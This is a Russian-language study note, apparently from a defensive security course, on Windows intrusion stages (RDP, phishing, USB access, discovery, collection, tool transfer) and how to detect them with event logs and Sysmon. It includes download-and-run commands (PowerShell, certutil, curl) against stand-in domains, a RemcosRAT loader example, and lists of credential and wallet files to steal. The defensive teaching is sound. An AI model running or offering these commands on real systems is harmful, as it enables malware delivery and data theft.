# Initial Access
> [!note] Intial Access
> Выделим два метода получения первоначального доступа
> 1. Использование сервисов
> 2. Использование людей

## Exposed Services
![[Pasted image 20260609162754.png]]
При размещении ресурса в интернете появляются определенные риски, систему могут сканировать автоматические боты которые ищут открытые порты, слабые пароли или непропатченные уязвимости. И если что то не защищено достаточно, атакующие используют это как доказано в этих MITRE техниках:

- [T1133 / External Remote Services(opens in new tab)](https://attack.mitre.org/techniques/T1133/): злоумышленники будут искать незащищенный RDP/VNC/SSH вместе со слабым паролем чтобы получить удаленный доступ к машине
- [T1190 / Exploit Public-Facing Application(opens in new tab)](https://attack.mitre.org/techniques/T1190/): Злоумышленики будут искать ошибки конфигурации или уязвимости веб приложений и сервисов

## User-Driven Methods
![[Pasted image 20260609163327.png]]Люди часто сами заражают свой компьютер из за кликов на опасные ссылки, запуска фишинговых вложений, использование пиратского софта, использование неизвестных USB устройств и так далее. Методы описанные в MITRE:

- [T1566 / Phishing(opens in new tab)](https://attack.mitre.org/techniques/T1566/): злоумышленники используют различные техники фишинга, заставляя пользователей запускать maleware самостоятельно 
- [T1091 / Removable Media(opens in new tab)](https://attack.mitre.org/techniques/T1091/): злоумышленники используют зараженные флешки и верят в то что пользователь использует этот USB в своем компьютере

## Initial Access Via RDP
### Detecting RDP Breach 
Ниже приведена таблица с примером атаки на RDP

| #   | этап Атаки                                                                    | Возможность обнаружения                                                                                                                                                         |
| --- | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Сетевое сканирование<br>Ботнет сканирует IP и обнаруживает открытые порты RDP | Сканирование портов с характерными признаками TCP SYN, неполного рукопожатия или UDP сканирования                                                                               |
| 2   | RDP Брутфорс<br>Ботнет начинает брутфорс пользователей                        | 1. Security logs event 4625<br>2.Фильтр на logon Type 3 или 10<br>3.Проверить аккаунт под которого были сделаны попытки входа<br>4.Все вы потенциально подтвердили RDP брутфорс |
| 3   | Initial Access via RDP<br>После 100 попыток, ботнет успешно подобрал пароль   | 1. Поменять Event ID на 4624<br>2. Проверить аккаунт на который получили доступ<br>3. Теперь можно сказать к какому аккаунту потенциально был получен доступ                    |
| 4   | Дальнейшие злонамеренные действия<br>                                         | 1. Фильтр на Logon Type 10, показывает логин по интерактивному RDP<br>2. Копировать Logon ID<br>3. Открыть логи Sysmon и искать события с тем же Logon ID                       |
## Initial Access via phishing
Ниже рассмотрены две техники фишинга 
### Binary Attachments(Бинарные вложения)
В Windows очень много исполняемых файлов, даже если пользователь не запускает недоверенные .exe, он может открыть `.com .src .cpl` файлы, но все они могут содержать maleware внутри. 

Windows усугубила ситуацию тем что по умолчанию расширения не показываются поэтому атакующий может написать `invoice.pdf.exe` чтобы изменить иконку на достоверную 
![[Pasted image 20260609171757.png]]
![[Pasted image 20260609171853.png]]

### LNK Attachments (ссылочные вложения)
Чтобы избежать обнаружения антивирусом, злоумышленники предпочитают вложения Powershell, VisualBasic или BAT скрипты, Популярный путь создать скрипт выглядящий доверительно это спрятать его в LNK shortcuts - похожий файл на компьютере который исполняется 

Например: вы получаете архив который содержит PDF со скидками и там правда больше ничего нет а рядом ссылка, по факту ведущая к исполнению PoswerShell скрипта
![[Pasted image 20260609172553.png]]

Пример содержимого такого скрипта:
```powershell
powershell.exe -c ... 
# Download the encoded malware 
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe'); 
# Run the malware (RemcosRAT) 
start C:\\ProgramData\\r.exe;
```

### Detecting Malicious Download
Поймать вредоносное скачивание достаточно сложно если понимать как уязвимый пользователь видит это. Первое, пользователь использует web браузер или приложение на компьютере для открытия фишингово вложения. В простом случае это будет direct.exe malware загрузчик, но чаще можно увидеть архив который содержит вредонос, в этом случае Sysmon может помочь определить атаку:

```powershell
# 1. Sysmon Event ID 1: Web browser is launched Image: 
C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ParentImage: C:\Windows\Explorer.EXE 
# 2. Sysmon Event ID 11: A file (usually archive) appears in Downloads Image: 
C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe TargetFilename: C:\Users\User\Downloads\invoice.zip* 
# 3. Sysmon Event ID 11: Optionally, the user unarchives files to some folder Image: 
C:\Windows\Explorer.EXE (or C:\Program Files\7-Zip\7zG.exe) TargetFilename: C:\Users\User\Downloads\invoice.pdf.exe 
# 4. Sysmon Event ID 1: The user double-clicks the unarchived file Image: 
C:\Users\User\Downloads\invoice.pdf.exe ParentImage: C:\Windows\Explorer.EXE
```

![[Pasted image 20260609175815.png]]
#### Заметки по LNK вложениям
В отличии от бинарных вложений, LNK файлы обладают интересной особенностью, они оставляют минимальные следы выполнения. Ниже приведен файл который выглядит как ярлык Chrome но исполняет скрипт Powershell
![[Pasted image 20260609180204.png]]
## Initial Access Via USB
### Detecting an infected USB
Существует множество продвинуты методов автоматического запуска malware с накопителя, но в большинстве случаев это происходит потому что пользователь сам запускает вредоносное ПО, например:

- malware скрывает все легитимные файлы на USB и создает вредоносный `recovery.lnk`
- malware создает исполняемый файл `Photos.exe` и меняет его значок на значок обычной папки
- malware копирует все файлы с расширением например `.jpg.exe` 

Интересно то что обнаружение вредоносного доступа через USB очень похоже на фишинговые вложения, поскольку оба метода основаны на запуске вредоносного исполняемого файла пользователем через GUI.
![[Pasted image 20260609181845.png]]

# Discovery Overview 
![[Pasted image 20260609182741.png]]
После получения первоначального доступа в систему злоумышленник переходит к следующей фазе, то есть разведке
Для начало атакующему нужно понять где он и какие права имеет для справки можно воспользоваться этой табличкой: 

| Цель разведки                                                                       | CMD/Posershell команды                                                                    |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| файлы и папки<br>(Определить назначение хоста, работу жертвы и ее интересы)         | `type <filename>`, `Get-Content <filename>`, `dir <dir name>`, `Get-ChildItem <папка>`    |
| Пользователи и группы<br>(Определить кто использует хост и какие у него привилегии) | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`                     |
| Система и приложения<br>(Определить уязвимости или приложения для кражи данных)     | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`               |
| Сетевые настройки<br>(Определить принадлежит ли хост корпоративной сети)            | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`                     |
| Активный антивирус<br>(Оценить риск продолжения атаки без обнаружения)              | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |
## Процесс разведки
После доставки вложения оно базово использует команды для исследования и понимания на каком хосту оно находится, иногда malware может даже удалить себя если обнаружит определенный антивирус или страну или компанию. После разведки оно подключается к злоумышленнику давая ему полный контроль над жертвой. 
![[Pasted image 20260609184026.png]]

## Discovery via CMD
при исследовании при помощи CMD поймать злоумышленника достаточно легко потому что большинство запущенных команд регистрируются как новые процессы, как показано в дереве процессов ниже: 

```
C:\Users\victim\Downloads\invoice.pdf.exe 
├── C:\Windows\System32\cmd.exe 
│ ├── ipconfig // Show network settings 
│ ├── whoami /priv // Show user permissions 
│ ├── dir // List current directory 
│ ├── net user // List all local users 
│ ├── tasklist /v // Show running processes 
│ └── wmic computersystem get model // Query for laptop model 
└── C:\Windows\...\powershell.exe 
    ├── Get-Service // List active services 
    └── Get-MpPreference // Check MS Defender settings
```

## Discovery через GUI 
В случаях когда злоумышленники входят в систему интерактивно, они не ограничиваются просто командами, имея доступ к графическому интерфейсу, ни что не мешает использовать тот же набор команд, ниже приведено дерево процессов:

```
C:\Windows\System32\explorer.exe 
├── C:\Windows\System32\cmd.exe // Attacker can still use CMD! 
│ └── ... 
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc // Open Computer Management 
├── C:\Windows\system32\control.exe netconnections // List network adapters 
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe [...] // Access settings panel ├── C:\Windows\system32\notepad.exe C:\...\secrets.txt // Read a text file 
└── C:\Windows\system32\taskmgr.exe // Run Task Manager
```

## Обнаружение разведки 
первый потенциальный признак обнаружения это найди команду которая помогает в разведке а лучше множество команд которые запущены в короткий период времени. Вы увидите их как Process Creation который отображаются с ID 1 или как новые строчки в истории powershell. 

![[Pasted image 20260609190356.png]]

# Collecting 
![[Pasted image 20260609190815.png]]
## Collection targets
в зависимости от того какие цели преследуют злоумышленники необходимые им данные могут отличаться
Большая часть конфиденциальных данных скрыта в файлах но секреты также могут быть скрыты в реестре или памяти процесса, ниже представлен пример: 

```shell
# [Goal: Blackmail Victim] Photos, Chats, Browser History
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [Goal: Steal Money] Web Banking Sessions, Crypto Wallets
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [Goal: Steal Corporate Data] SSH Credentials, Databases
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

## Exfiltration Data
Данные собираются либо автоматически либо в ручную. Для скриптов это процесс занимает не больше минуты, но может занять часы для атакующего чтобы найти интересные файлы. Тем не менее оба метода завершаются эксфильтрацией, и злоумышленники могут проявить изобретательность, например: 

- Сливать данные в DropBox, Mega, Amazon S3 или другие доверенные облака
- Сливать данные на репозитории Github или в мессенджерах, таких как телеграмм
- или просто создать доверительно выглядящий домен и отправлять туда данные

## Detecting Collection 
Аналогично с разведкой злоумышленник может использовать графический интерфейс для нахождения чувствительной информации. Он будет искать определенные интересующие его файлы, например команды: 

| Пример команды | Описание |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Злоумышленники использовали Блокнот для просмотра содержимого интересующего файла |
| CMD: `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Злоумышленники искали ключевое слово «password» в конкретном файле |
| PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Злоумышленники искали PDF-файлы в домашней папке пользователя |
| PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\` | Злоумышленники скопировали историю переписки Signal в директорию Temp |
| PowerShell: `Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip` | Злоумышленники архивировали похищенные данные, готовясь к их эксфильтрации |
| `7za.exe a -tzip C:\Temp\stolen_data.zip C:\\Temp\\*.*` | Альтернативный вариант — злоумышленники используют уже установленный архиватор, например 7-Zip |
![[Pasted image 20260609192411.png]]

### Стиллеры
Стиллеры часто используются для сбора данных и они не используют команды и не создают процессы поэтому часто их сложнее обнаружить
![[Pasted image 20260609192557.png]]
Пример кода стиллера который ворует сессии в телеграм


# Внутренняя передача инструментов при взломе
На определенном этапе взлома злоумышленнику может потребоваться дополнительные инструменты, например
- `Seatbelt` - автоматизированный поиск уязвимостей
- Инструменты которые используются для извлечения учетных данных OC например `Mimikatz`, 
- Полностью функциональный троян удаленного доступа(RAT), например `Remcos RAT` 
- Или бинарный файл программы-вымогателя для шифрования системы после кражи данных  

Процесс скачивания дополнительных инструментов по MITRE соответствует [Ingress Tool Transfer(opens in new tab)](https://attack.mitre.org/techniques/T1105/) техникам, и используется в большинстве случаев взлома. Вы уже видели пример когда вложение LNK использовало PowerShell для загрузки дополнительного malware, но существует множество других способ передачи даже без Powershell
## Альтернативные способы скачивания

| Метод загрузки инструментов | Команды CMD / PowerShell                                                                      |
| --------------------------- | --------------------------------------------------------------------------------------------- |
| Через Certutil              | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`                             |
| Через Curl (Windows 10+)    | `curl.exe https://blackhat.thm/bad.exe -o good.exe`                                           |
| Через PowerShell IWR        | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`   |
| Через графический интерфейс | CMD не требуется - вредоносное ПО копируется напрямую через RDP или загружается через браузер |
## Обнаружение Tool Transfer
Так как для передачи данных требуется сетевое соединение то лучшим вариантом будет отслеживание сетевого соединения или DNS запросов от подозрительного процесса. Однако следует отметить, что злоумышленники часто пытаются избежать обнаружения, загружая инструменты из легитимных сервисов таких как GitHub, поэтому обязательно анализируйте какой процесс устанавливает соединение, домен и загружаемый файл.
![[Pasted image 20260609194634.png]]
